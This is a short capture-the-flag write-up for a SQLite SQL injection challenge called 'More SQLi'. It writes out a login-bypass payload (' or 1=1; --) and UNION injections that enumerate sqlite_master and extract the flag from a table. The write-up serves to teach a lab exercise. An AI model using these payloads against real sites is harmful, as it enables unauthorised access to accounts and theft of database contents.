# More SQLi
This is sqlite's sql injection problem.

# Description

Author: Mubarak Mikail

Can you find the flag on this website. Try to find the flag 

Hint SQLiLite

# Solution
Lets first try username admin and password admin
![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/4bf56103-2d9c-41f5-8aa0-8c47950f7e7f)

We can see how it do the select !
![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/12a2f791-bbf2-4975-bc11-4bc35539be16)

Lets try payload username ' or 1=1; -- password ' or 1=1; --


![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/6c7e37bf-338c-4d74-b2b9-8436d89043e9)

Success !!!!!

![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/39eb3863-d21b-47f9-b7d8-ecf55f63598b)

 We can see here it has three attribute and based on the hint. Lets try this payload.
 
 ' union select name, sql, null from sqlite_master;--
 
 If you are unfamilier with this. Please check https://www.techonthenet.com/sqlite/sys_tables/index.php

 ![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/eba4dece-9028-4c71-a62a-fbd65a8f8f71)

Lets check the flag in the more_table. Try this payload ' union select flag, null, null from more_table; --
![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/e30b3bda-bff3-4bf6-a7e4-309e2263b9df)

We get the flag!

